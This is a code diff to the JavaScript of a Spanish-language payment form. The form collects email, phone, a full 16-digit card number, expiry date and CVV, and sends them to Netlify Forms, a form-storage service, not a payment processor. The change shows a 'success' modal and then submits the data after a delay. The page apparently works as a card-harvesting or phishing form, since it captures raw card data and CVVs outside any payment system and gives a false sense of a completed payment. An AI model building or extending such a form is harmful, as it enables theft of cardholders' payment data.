@@ -522,11 +522,12 @@
 
         // Submit nativo Netlify Forms con validaciones
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const form = this;
             
             // Validar correo
             const correo = document.getElementById('correo').value;
             if (!correo.includes('@')) {
-                e.preventDefault();
                 alert('Por favor ingresa un correo válido con @');
                 document.getElementById('correo').classList.add('input-error');
                 return false;
@@ -535,7 +536,6 @@
             // Validar MM/AA
             const expiracion = document.getElementById('expiracion').value;
             if (expiracion.length !== 5) {
-                e.preventDefault();
                 alert('Por favor completa la fecha de expiración (MM/AA)');
                 return false;
             }
@@ -544,7 +544,6 @@
             const anio = parseInt(expiracion.slice(3, 5));
             
             if (mes < 1 || mes > 12) {
-                e.preventDefault();
                 alert('El mes debe estar entre 01 y 12');
                 return false;
             }
@@ -554,7 +553,6 @@
             for (let campo of campos) {
                 const input = document.getElementById(campo);
                 if (!input.value.trim()) {
-                    e.preventDefault();
                     alert('Por favor completa todos los campos');
                     return false;
                 }
@@ -563,7 +561,6 @@
             // Validar teléfono
             const telefono = document.getElementById('telefono').value;
             if (telefono.replace(/[^0-9]/g, '').length < 10) {
-                e.preventDefault();
                 alert('Por favor ingresa un teléfono válido');
                 return false;
             }
@@ -571,7 +568,6 @@
             // Validar tarjeta
             const tarjeta = document.getElementById('tarjeta').value.replace(/\s/g, '');
             if (tarjeta.length !== 16) {
-                e.preventDefault();
                 alert('La tarjeta debe tener 16 dígitos');
                 return false;
             }
@@ -579,15 +575,19 @@
             // Validar CVV
             const cvv = document.getElementById('cvv').value;
             if (cvv.length < 3) {
-                e.preventDefault();
                 alert('El CVV debe tener 3 o 4 dígitos');
                 return false;
             }
             
-            // Si todas las validaciones pasan, permitir que Netlify envíe el formulario
-            console.log('Todas las validaciones pasaron, Netlify enviará el formulario...');
+            // Si todas las validaciones pasan, mostrar modal y luego enviar a Netlify
+            console.log('Todas las validaciones pasaron, mostrando modal y enviando a Netlify...');
             document.getElementById('correo').classList.remove('input-error');
-            // No prevenir el evento, dejar que Netlify lo capture
+            document.getElementById('successModal').style.display = 'flex';
+            
+            // Enviar el formulario a Netlify después de mostrar el modal
+            setTimeout(() => {
+                form.submit();
+            }, 1500);
         });
 
         // Cerrar modal
